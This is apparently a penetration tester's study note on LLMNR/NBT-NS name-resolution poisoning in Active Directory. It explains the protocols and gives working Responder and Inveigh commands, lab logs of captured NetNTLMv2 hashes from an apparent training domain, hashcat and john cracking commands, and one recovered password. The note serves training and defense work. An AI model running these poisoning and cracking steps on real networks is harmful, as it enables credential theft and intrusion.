---
created: 2026-07-30
updated: 2026-10-18
tags:
  - AD
  - AD_attacks
status: complete
---
## LLMNR and NBT-NS poisoning attack

>**LLMNR/NBT-NS poisoning** is a man-in-the-middle (MitM) attack that exploits legacy Windows name resolution protocols to make clients authenticate to an attacker-controlled server and disclose NT hashes.

>[!important] LLMNR/NBT-NS poisoning requires access to the target network segment (broadcast domain).

- The LLMNR/NBT-NS poisoning attack doesn't require any credentials, only access to the target network. This makes it a standard first technique in internal engagements. 

- Captured hashes can be cracked ([[Hashcat]]/[[🛠️ JohnTheRipper]]) or used in SMB relay when SMB signing is disabled.

>[!note] MITRE ATT&CK: [`T1557.001 — Adversary-in-the-Middle: Name Resolution Poisoning and SMB Relay`](https://attack.mitre.org/techniques/T1557/001/).

>[!important] NetNTLMv2 can't be replayed for [[Pass-the-Hash]] attacks (which require the raw NT hashes).
### Name resolution in Windows

- By default, if Windows can't resolve a domain name using DNS, it falls back to **LLMNR (Link-Local Multicast Name Resolution)**, then **NBT-NS (NetBIOS Name Services)** protocols, in order.
- Neither protocol implements any authentication mechanisms or cryptographic validation, therefore **any host can respond to a resolution request**. This makes LLMNR and NBT-NS vulnerable to **poisoning attacks**.
#### LLMNR

> **[LLMNR (Link-Local Multicast Name Resolution)](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)** is a legacy protocol that allows devices on a local network to resolve hostnames to IP addresses on the same local link without relying on a DNS server.

>[!note] LLMNR is defined in [`RFC 4795`](https://datatracker.ietf.org/doc/html/rfc4795).

- LLMNR serves as a **fallback** when DNS resolution fails. Windows tries DNS first, and if DNS doesn't respond, it falls back to LLMNR. 
- The protocol is **enabled by default** on Windows Vista and later (including Windows 10/11 and Windows Server 2008+).
- LLMNR uses **UDP port `5355`**; queries are sent to the link-local **multicast address** (`224.0.0.252` for IPv4 or `FF02::1:3` for IPv6).
- **Any host on the link may answer any query**, since responders are not authenticated.

>[!note] LLMNR queries use the standard DNS message format, therefore they are human-readable in packet captures.
#### NBT-NS

> **[NBT-NS (NetBIOS Name Service)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10))** is a legacy Windows name-resolution 

> [!note] NBT-NS is defined in [`RFC 1001`](https://datatracker.ietf.org/doc/html/rfc1001) and [`RFC 1002`](https://datatracker.ietf.org/doc/html/rfc1002).

- NBT-NS queries are **broadcast on UDP port `137`**; hosts that recognize the name respond with their IP address.
- Same as in LLMNR, responses are not authenticated, therefore any host can answer any query.
- The protocol is disabled by default for IPv6 since Windows Vista/Server 2008, but **still enabled for IPv4** in most environments for backward compatibility.

>[!note] NBT-NS is part of the **NetBIOS over TCP/IP (NBT)** suite, alongside NBSS (NetBIOS Session Service, TCP port `139`) and NBDS (NetBIOS Datagram Service, UDP port `138`).

### The attack flow

- Since LLMNR and NBT-NS implement no authentication or cryptographic validation of responses, any host can claim any requested name.
- You start listening for LLMNR/NBT-NS traffic and answer every fallback query faster than any legitimate host, so the victim connects to **your machine** instead of the intended destination. 
- The victim then authenticates to your rogue service (SMB, HTTP, MSSQL, FTP, LDAP, etc.) and reveals a **NetNTLMv2** challenge-response.

---

- Poisoning only works when a client resolves a name that **fails DNS resolution**; otherwise the fallback protocols are not used. 
- Common triggers: 
	- **Typos** (analogous to [typosquatting](https://en.wikipedia.org/wiki/Typosquatting)), e.g., a user typing `\\printre01` instead of `\\printer01`.
	- **Stale DNS records** pointing to a decommissioned server. 
	- **Automated processes** (scheduled tasks, services, scripts) querying hostnames that are no longer registered in DNS.
	- **WPAD** discovery queries.

>[!tip]+
>- The longer the poisoner runs, the more clients and hashes it captures.  

- Attack flow:
	1. **Trigger** — a user or process tries to reach a resource by a name that fails DNS resolution (e.g., `\\fileserver01`).
	2. **LLMNR query** — the client multicasts a query on UDP `5355` asking who owns the name.
	3. **NBT-NS query** — if LLMNR yields no answer, the client broadcasts the same query on UDP `137`.
	4. **Poisoning** — `Responder`/`Inveigh` answers both queries, claiming its own IP address for the requested name.
	5. **Authentication** — the victim initiates a connection (SMB, HTTP, MSSQL, ...) to the rogue server, which requests authentication.
	6. **Capture** — the client computes and sends its **NetNTLMv2** response; the tool logs it.
	7. **Exploitation** — the hash is cracked offline to recover the cleartext password, or relayed to another host.
	
## Poisoning from Linux: `Responder`

- [`Responder`](https://github.com/lgandx/Responder) is the standard tool for LLMNR/NBT-NS (and mDNS) poisoning on Linux. Analyze the traffic (`-A`), poison, then collect captured caches.

### Analyzing traffic

- Before poisoning, run `Responder` in the analyze mode (`-A`) to passively observe LLMNR/NBT-NS traffic on the network without interfering.
- This confirms that the protocols are in use and helps identify domain names, active hosts, and accounts without sending any spoofed responses. 

```bash
sudo responder -I eth0 -A
```

| Option | Description                                    |
| ------ | ---------------------------------------------- |
| `-I`   | Network interface to listen on.                |
| `-A`   | Analyze mode (log all queries, never respond). |

>[!example]-
> ```bash
> sudo responder -I ens224 -A
> ```
> 
> ```bash                                  __
>   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
>   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
>   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
>                    |__|
> 
>            NBT-NS, LLMNR & MDNS Responder 3.0.6.0
> 
>   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
>   To kill this script hit CTRL-C
> 
> 
> [+] Poisoners:
>     LLMNR                      [ON]
>     NBT-NS                     [ON]
>     DNS/MDNS                   [ON]
> 
> [+] Servers:
>     HTTP server                [ON]
>     HTTPS server               [ON]
>     WPAD proxy                 [OFF]
>     Auth proxy                 [OFF]
>     SMB server                 [ON]
>     Kerberos server            [ON]
>     SQL server                 [ON]
>     FTP server                 [ON]
>     IMAP server                [ON]
>     POP3 server                [ON]
>     SMTP server                [ON]
>     DNS server                 [ON]
>     LDAP server                [ON]
>     RDP server                 [ON]
>     DCE-RPC server             [ON]
>     WinRM server               [ON]
> 
> [+] HTTP Options:
>     Always serving EXE         [OFF]
>     Serving EXE                [OFF]
>     Serving HTML               [OFF]
>     Upstream Proxy             [OFF]
> 
> [+] Poisoning Options:
>     Analyze Mode               [ON]
>     Force WPAD auth            [OFF]
>     Force Basic Auth           [OFF]
>     Force LM downgrade         [OFF]
>     Fingerprint hosts          [OFF]
> 
> [+] Generic Options:
>     Responder NIC              [ens224]
>     Responder IP               [172.16.5.225]
>     Challenge set              [random]
>     Don't Respond To Names     ['ISATAP']
> 
> [+] Current Session Variables:
>     Responder Machine Name     [WIN-2DUO4WNZC2X]
>     Responder Domain Name      [6V63.LOCAL]
>     Responder DCE-RPC Port     [47689]
> [i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
> [Analyze mode: ICMP] You can ICMP Redirect on this network.
> [Analyze mode: ICMP] This workstation (172.16.5.225) is not on the same subnet than the DNS server (1.1.1.1).
> [Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
> [Analyze mode: ICMP] You can ICMP Redirect on this network.
> [Analyze mode: ICMP] This workstation (172.16.5.225) is not on the same subnet than the DNS server (8.8.8.8).
> [Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
> [!] Error starting TCP server on port 3389, check permissions or other servers running.
> 
> [+] Listening for events...
> 
> [Analyze mode: NBT-NS] Request by 172.16.5.130 for ACADEMY-EA-WEB0, ignoring
> [Analyze mode: MDNS] Request by 172.16.5.130 for academy-ea-web0.local, ignoring
> [Analyze mode: NBT-NS] Request by 172.16.5.130 for ACADEMY-EA-WEB0, ignoring
> [Analyze mode: LLMNR] Request by 172.16.5.130 for academy-ea-web0, ignoring
> [Analyze mode: LLMNR] Request by 172.16.5.130 for academy-ea-web0, ignoring
> [Analyze mode: NBT-NS] Request by 172.16.5.130 for ACADEMY-EA-WEB0, ignoring
> [Analyze mode: MDNS] Request by 172.16.5.130 for academy-ea-web0.local, ignoring
> 
> 
> [Analyze mode: LLMNR] Request by 172.16.5.130 for academy-ea-web0, ignoring
> [Analyze mode: NBT-NS] Request by 172.16.5.130 for ACADEMY-EA-WEB0, ignoring
> [Analyze mode: LLMNR] Request by 172.16.5.130 for academy-ea-web0, ignoring
> [SMB] NTLMv2-SSP Client   : 172.16.5.130
> [SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
> [SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:cbb35e7b2ba3a17c:509A2B15ABC360B7EFA5D3CDFC9B14CF:010100000000000000763605A920DD010A6D3CD67EAAB3F90000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
> [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
> [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
> [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
> [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
> [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
> [Analyze mode: NBT-NS] Request by 172.16.5.130 for ACADEMY-EA-WEB0, ignoring
> [Analyze mode: NBT-NS] Request by 172.16.5.130 for ACADEMY-EA-WEB0, ignoring
> [Analyze mode: MDNS] Request by 172.16.5.130 for academy-ea-web0.local, ignoring
> [Analyze mode: LLMNR] Request by 172.16.5.130 for academy-ea-web0, ignoring
> ```

- In analyze mode, `Responder` prints every LLMNR/NBT-NS/mDNS request it observes but doesn't send any spoofed replies.
- If no LLMNR/NBT-NS queries are observed, poisoning is unlikely to yield any results.

>[!note] See [[🛠️ Responder]].
### Poisoning

- Once LLMNR/NBT-NS traffic has been detected, start poisoning:

```bash
sudo responder -I eth0 -wv
```

| Flag                 | Purpose                                                                   |
| -------------------- | ------------------------------------------------------------------------- |
| `-I` , `--interface` | Network interface to use (`ALL` for all interfaces).                      |
| `-w`, `--wpad`       | Start the rogue WPAD proxy server to catch HTTP traffic (default: `off`). |
| `-v`, `--verbose`    | Verbose output (recommended).                                             |

- `Responder` automatically starts rogue servers for **SMB, HTTP, HTTPS, MSSQL, FTP, LDAP, Kerberos, DNS, POP3, IMAP, SMTP, RDP, WinRM** and more. 
- Individual servers can be toggled in `Responder.conf` (`/usr/share/responder/` or `/etc/responder/`, depending on the installation).

>[!important] `Responder` must be run as `root`; make sure the following ports are free on the attack host: TCP `21`, `25`, `80`, `110`, `135`, `139`, `445`, `587`, `1433`, `3128`, `3141`; UDP/TCP `389`; UDP `53`, `137`, `138`, `1434`; multicast UDP `5355`, `5353`.

> [!tip]+
> - Run `Responder` inside a `tmux`/`screen` session and leave it running in the background while you perform other enumeration tasks. Hashes are logged automatically.
### Collecting captured hashes

- Hashes are written to individual files in the `logs/` directory of the `Responder` installation (e.g. `/usr/share/responder/logs/`), named `(MODULE)-(HASH_TYPE)-(CLIENT_IP).txt`. 
- A session database (`Responder.db`, SQLite) is stored in the same directory.

>[!important] `Responder` does not deduplicate — identical hashes appear repeatedly in the logs.

> [!note] The hash format for Hashcat mode `5600` (NTLMv2) is `USERNAME::DOMAIN:CHALLENGE:HMAC-MD5:BLOB`.

```bash
ls /usr/share/responder/logs/
```

>[!example]-
> ```bash
> ls -1 /usr/share/responder/logs
> ```
> 
> ```bash
> Analyzer-Session.log
> Config-Responder.log
> Poisoners-Session.log
> Responder-Session.log
> SMB-NTLMv2-SSP-172.16.5.130.txt
> ```

>[!example]-
>- Captured hashes look like this:
> ```bash
> cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt
> ```
> 
> ```bash
> clusteragent::INLANEFREIGHT:cbb35e7b2ba3a17c:509A2B15ABC360B7EFA5D3CDFC9B14CF:010100000000000000763605A920DD010A6D3CD67EAAB3F90000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> clusteragent::INLANEFREIGHT:186526872cf85bb1:CDDDDAB8EFD77502280919428B2F2215:010100000000000000763605A920DD013910DB7845BAA6D00000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> # ...
> backupagent::INLANEFREIGHT:b719d890612db084:26536D7978A91534139CEAE51D2A8515:010100000000000000763605A920DD01FC5AE1CF67A2FD9F0000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> backupagent::INLANEFREIGHT:b719d890612db084:26536D7978A91534139CEAE51D2A8515:010100000000000000763605A920DD01FC5AE1CF67A2FD9F0000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> # ...
> wley::INLANEFREIGHT:d6c67a27bf9112ec:689BCCA479375454E0A81176FA86356A:010100000000000000763605A920DD011AC821D80421E8480000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> wley::INLANEFREIGHT:d6c67a27bf9112ec:689BCCA479375454E0A81176FA86356A:010100000000000000763605A920DD011AC821D80421E8480000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> # ...
> svc_qualys::INLANEFREIGHT:d9c8f7152cf7f89b:CD6F4BC0FDA0CFAE10C5EAE53D776E0E:010100000000000000763605A920DD01BDFE560605D15A8B0000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> svc_qualys::INLANEFREIGHT:d9c8f7152cf7f89b:CD6F4BC0FDA0CFAE10C5EAE53D776E0E:010100000000000000763605A920DD01BDFE560605D15A8B0000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> # ...
> forend::INLANEFREIGHT:633919eab323815d:FF0D6B65DB8C10EB40F782B75C384A73:010100000000000000763605A920DD01135786E86BEE4F060000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> forend::INLANEFREIGHT:633919eab323815d:FF0D6B65DB8C10EB40F782B75C384A73:010100000000000000763605A920DD01135786E86BEE4F060000000002000800360056003600330001001E00570049004E002D003200440055004F00340057004E005A0043003200580004003400570049004E002D003200440055004F00340057004E005A004300320058002E0036005600360033002E004C004F00430041004C000300140036005600360033002E004C004F00430041004C000500140036005600360033002E004C004F00430041004C000700080000763605A920DD0106000400020000000800300030000000000000000000000000300000BCFE15EABEC99969EF010DA2F0F02C2E4698832CCD0A9237DB287269C1460B790A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
> # ...
> ```
> 
## Cracking the hashes

- Hashes `Responder` captures are typically NetNTLMv2 ([[Hashcat]] mode `5600`); NetNTLMv1 (Hashcat mode `5500`) may appear in legacy environments. 

>[!tip]+
>- Use the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page to identify unknown formats.

- Crack an NetNTLMv2 hash:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- For NetNTLMv1:

```bash
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

>[!tip]+ In Hashcat, to save results to a file, add `--outfile file.txt`, and to show previously cracked results, add `--show`.

>[!example]-
> ```bash
> hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
> ```
> 
> ```bash
> hashcat (v7.1.2) starting
> 
> OpenCL API (OpenCL 3.0 ) - Platform #1 [Mesa/X.org]
> ===================================================
> * Device #01: AMD Radeon 780M Graphics (radeonsi, phoenix, ACO, DRM 3.64, 7.1.3-arch1-2), 4426/8852 MB (850 MB allocatable), 12MCU
> 
> Minimum password length supported by kernel: 0
> Maximum password length supported by kernel: 256
> Minimum salt length supported by kernel: 0
> Maximum salt length supported by kernel: 256
> 
> Hashes: 1 digests; 1 unique digests, 1 unique salts
> Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
> Rules: 1
> 
> Optimizers applied:
> * Zero-Byte
> * Not-Iterated
> * Single-Hash
> * Single-Salt
> 
> 
> Host memory allocated for this attack: 722 MB (5937 MB free)
> 
> Dictionary cache built:
> * Filename..: rockyou.txt
> * Passwords.: 14344391
> * Bytes.....: 139921497
> * Keyspace..: 14344384
> * Runtime...: 1 sec
> 
> BACKUPAGENT::INLANEFREIGHT:b719d890612db084:26536d7978a91534139ceae51d2a8515:010100000000000000763605a920dd01fc5ae1cf67a2fd9f0000000002000800360056003600330001001e00570049004e002d003200440055004f00340057004e005a0043003200580004003400570049004e002d003200440055004f00340057004e005a004300320058002e0036005600360033002e004c004f00430041004c000300140036005600360033002e004c004f00430041004c000500140036005600360033002e004c004f00430041004c000700080000763605a920dd0106000400020000000800300030000000000000000000000000300000bcfe15eabec99969ef010da2f0f02c2e4698832ccd0a9237db287269c1460b790a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
>                                                           
> Session..........: hashcat
> Status...........: Cracked
> Hash.Mode........: 5600 (NetNTLMv2)
> Hash.Target......: BACKUPAGENT::INLANEFREIGHT:b719d890612db084:26536d7...000000
> Time.Started.....: Fri Jul 31 11:42:53 2026 (1 sec)
> Time.Estimated...: Fri Jul 31 11:42:54 2026 (0 secs)
> Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
> Guess.Base.......: File (rockyou.txt)
> Guess.Queue......: 1/1 (100.00%)
> Speed.#01........:  5431.4 kH/s (13.31ms) @ Accel:354 Loops:1 Thr:64 Vec:1
> Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
> Progress.........: 7884288/14344384 (54.96%)
> Rejected.........: 0/7884288 (0.00%)
> Restore.Point....: 7612416/14344384 (53.07%)
> Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
> Candidate.Engine.: Device Generator
> Candidates.#01...: hgfhghghg -> gig981nook
> 
> Started: Fri Jul 31 11:42:37 2026
> Stopped: Fri Jul 31 11:42:55 2026
> ```

> [!tip]+
> - NetNTLMv2 is slower to crack than plain NTLM because each guess requires an HMAC-MD5 computation. Use a GPU rig or cloud instance for large wordlists and rule sets.

- With a recovered password:
	- Enumerate the domain via LDAP, SMB, WinRM, or RDP -> see [[🛠️ AD enumeration & discovery]]
	- Spray the password against other accounts (check for reuse) -> see [[Password spraying in AD]].
	- Authenticate to hosts and continue privilege escalation -> see [[Privileged remote access]].
## Poisoning from Windows: `Inveigh`

- [`Inveigh`](https://github.com/Kevin-Robertson/Inveigh) is the Windows equivalent of `Responder` (LLMNR, NBT-NS, mDNS poisoning plus rogue HTTP/HTTPS/WPAD servers). 
- `Inveigh` comes in two versions:
	- `Inveigh.ps1` — PowerShell (legacy, but widely compatible).
	- `InveighZero` — C# (.NET) binary with a semi-interactive console.
### `Inveigh.ps1`

- To use `Inveigh` in PowerShell, download and import the module:

```powershell
Import-Module .\Inveigh.ps1
```

- List parameters:

```powershell
(Get-Command Invoke-Inveigh).Paramaters
```

>[!example]-
> ```powershell
> (Get-Command Invoke-Inveigh).Parameters
> ```
> ```powershell
> 
> Key                     Value
> ---                     -----
> ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
> KerberosHostHeader      System.Management.Automation.ParameterMetadata
> ProxyIgnore             System.Management.Automation.ParameterMetadata
> PcapTCP                 System.Management.Automation.ParameterMetadata
> PcapUDP                 System.Management.Automation.ParameterMetadata
> SpooferHostsReply       System.Management.Automation.ParameterMetadata
> SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
> SpooferIPsReply         System.Management.Automation.ParameterMetadata
> SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
> WPADDirectHosts         System.Management.Automation.ParameterMetadata
> WPADAuthIgnore          System.Management.Automation.ParameterMetadata
> ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
> ConsoleStatus           System.Management.Automation.ParameterMetadata
> ADIDNSThreshold         System.Management.Automation.ParameterMetadata
> ADIDNSTTL               System.Management.Automation.ParameterMetadata
> DNSTTL                  System.Management.Automation.ParameterMetadata
> HTTPPort                System.Management.Automation.ParameterMetadata
> HTTPSPort               System.Management.Automation.ParameterMetadata
> KerberosCount           System.Management.Automation.ParameterMetadata
> LLMNRTTL                System.Management.Automation.ParameterMetadata
> mDNSTTL                 System.Management.Automation.ParameterMetadata
> NBNSTTL                 System.Management.Automation.ParameterMetadata
> NBNSBruteForcePause     System.Management.Automation.ParameterMetadata
> ProxyPort               System.Management.Automation.ParameterMetadata
> RunCount                System.Management.Automation.ParameterMetadata
> RunTime                 System.Management.Automation.ParameterMetadata
> WPADPort                System.Management.Automation.ParameterMetadata
> SpooferLearningDelay    System.Management.Automation.ParameterMetadata
> SpooferLearningInterval System.Management.Automation.ParameterMetadata
> SpooferThresholdHost    System.Management.Automation.ParameterMetadata
> SpooferThresholdNetwork System.Management.Automation.ParameterMetadata
> ADIDNSDomain            System.Management.Automation.ParameterMetadata
> ADIDNSDomainController  System.Management.Automation.ParameterMetadata
> ADIDNSForest            System.Management.Automation.ParameterMetadata
> ADIDNSNS                System.Management.Automation.ParameterMetadata
> ADIDNSNSTarget          System.Management.Automation.ParameterMetadata
> ADIDNSZone              System.Management.Automation.ParameterMetadata
> HTTPBasicRealm          System.Management.Automation.ParameterMetadata
> HTTPContentType         System.Management.Automation.ParameterMetadata
> HTTPDefaultFile         System.Management.Automation.ParameterMetadata
> HTTPDefaultEXE          System.Management.Automation.ParameterMetadata
> HTTPResponse            System.Management.Automation.ParameterMetadata
> HTTPSCertIssuer         System.Management.Automation.ParameterMetadata
> HTTPSCertSubject        System.Management.Automation.ParameterMetadata
> NBNSBruteForceHost      System.Management.Automation.ParameterMetadata
> WPADResponse            System.Management.Automation.ParameterMetadata
> Challenge               System.Management.Automation.ParameterMetadata
> ConsoleUnique           System.Management.Automation.ParameterMetadata
> ADIDNS                  System.Management.Automation.ParameterMetadata
> ADIDNSPartition         System.Management.Automation.ParameterMetadata
> ADIDNSACE               System.Management.Automation.ParameterMetadata
> ADIDNSCleanup           System.Management.Automation.ParameterMetadata
> DNS                     System.Management.Automation.ParameterMetadata
> EvadeRG                 System.Management.Automation.ParameterMetadata
> FileOutput              System.Management.Automation.ParameterMetadata
> FileUnique              System.Management.Automation.ParameterMetadata
> HTTP                    System.Management.Automation.ParameterMetadata
> HTTPS                   System.Management.Automation.ParameterMetadata
> HTTPSForceCertDelete    System.Management.Automation.ParameterMetadata
> Kerberos                System.Management.Automation.ParameterMetadata
> LLMNR                   System.Management.Automation.ParameterMetadata
> LogOutput               System.Management.Automation.ParameterMetadata
> MachineAccounts         System.Management.Automation.ParameterMetadata
> mDNS                    System.Management.Automation.ParameterMetadata
> NBNS                    System.Management.Automation.ParameterMetadata
> NBNSBruteForce          System.Management.Automation.ParameterMetadata
> OutputStreamOnly        System.Management.Automation.ParameterMetadata
> Proxy                   System.Management.Automation.ParameterMetadata
> ShowHelp                System.Management.Automation.ParameterMetadata
> SMB                     System.Management.Automation.ParameterMetadata
> SpooferLearning         System.Management.Automation.ParameterMetadata
> SpooferNonprintable     System.Management.Automation.ParameterMetadata
> SpooferRepeat           System.Management.Automation.ParameterMetadata
> StatusOutput            System.Management.Automation.ParameterMetadata
> StartupChecks           System.Management.Automation.ParameterMetadata
> ConsoleOutput           System.Management.Automation.ParameterMetadata
> Elevated                System.Management.Automation.ParameterMetadata
> HTTPAuth                System.Management.Automation.ParameterMetadata
> mDNSTypes               System.Management.Automation.ParameterMetadata
> NBNSTypes               System.Management.Automation.ParameterMetadata
> Pcap                    System.Management.Automation.ParameterMetadata
> ProxyAuth               System.Management.Automation.ParameterMetadata
> Tool                    System.Management.Automation.ParameterMetadata
> WPADAuth                System.Management.Automation.ParameterMetadata
> KerberosHash            System.Management.Automation.ParameterMetadata
> FileOutputDirectory     System.Management.Automation.ParameterMetadata
> HTTPDirectory           System.Management.Automation.ParameterMetadata
> HTTPIP                  System.Management.Automation.ParameterMetadata
> IP                      System.Management.Automation.ParameterMetadata
> NBNSBruteForceTarget    System.Management.Automation.ParameterMetadata
> ProxyIP                 System.Management.Automation.ParameterMetadata
> SpooferIP               System.Management.Automation.ParameterMetadata
> WPADIP                  System.Management.Automation.ParameterMetadata
> ADIDNSCredential        System.Management.Automation.ParameterMetadata
> KerberosCredential      System.Management.Automation.ParameterMetadata
> Inspect                 System.Management.Automation.ParameterMetadata
> invalid_parameter       System.Management.Automation.ParameterMetadata
> Verbose                 System.Management.Automation.ParameterMetadata
> Debug                   System.Management.Automation.ParameterMetadata
> ErrorAction             System.Management.Automation.ParameterMetadata
> WarningAction           System.Management.Automation.ParameterMetadata
> InformationAction       System.Management.Automation.ParameterMetadata
> ErrorVariable           System.Management.Automation.ParameterMetadata
> WarningVariable         System.Management.Automation.ParameterMetadata
> InformationVariable     System.Management.Automation.ParameterMetadata
> OutVariable             System.Management.Automation.ParameterMetadata
> OutBuffer               System.Management.Automation.ParameterMetadata
> PipelineVariable        System.Management.Automation.ParameterMetadata
> ```

- Start LLMNR/NBT-NS spoofing with default settings:

```powershell
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y
```

>[!example]-
> ```powershell
> PS C:\tools> Invoke-Inveigh -ConsoleOutput Y LLMNR Y NBSN Y
> ```
> 
> ```powershell
> [*] Inveigh 1.506 started at 2026-07-31T02:56:56
> [+] Elevated Privilege Mode = Enabled
> [+] Primary IP Address = 172.16.5.25
> [+] Spoofer IP Address = 172.16.5.25
> [+] ADIDNS Spoofer = Disabled
> [+] DNS Spoofer = Enabled
> [+] DNS TTL = 30 Seconds
> [+] LLMNR Spoofer = Enabled
> [+] LLMNR TTL = 30 Seconds
> [+] mDNS Spoofer = Disabled
> [+] NBNS Spoofer = Disabled
> [+] SMB Capture = Enabled
> [+] HTTP Capture = Enabled
> [+] HTTPS Capture = Disabled
> [+] HTTP/HTTPS Authentication = NTLM
> [+] WPAD Authentication = NTLM
